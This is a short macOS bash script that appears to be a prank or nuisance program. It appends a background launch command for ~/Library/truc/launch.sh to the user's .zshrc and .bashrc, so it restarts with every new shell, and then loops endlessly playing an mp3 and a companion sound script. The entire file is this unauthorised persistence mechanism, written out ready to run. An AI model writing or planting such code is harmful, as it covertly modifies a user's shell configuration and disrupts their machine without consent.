#!/bin/bash
echo "nohup sh ~/Library/truc/launch.sh &" >> ~/.zshrc
echo "nohup sh ~/Library/truc/launch.sh &" >> ~/.bashrc

while true  
do
	sleep 2
	nohup sh sound.sh &
	afplay mohamedhenni.mp3
	killall sound.sh
done
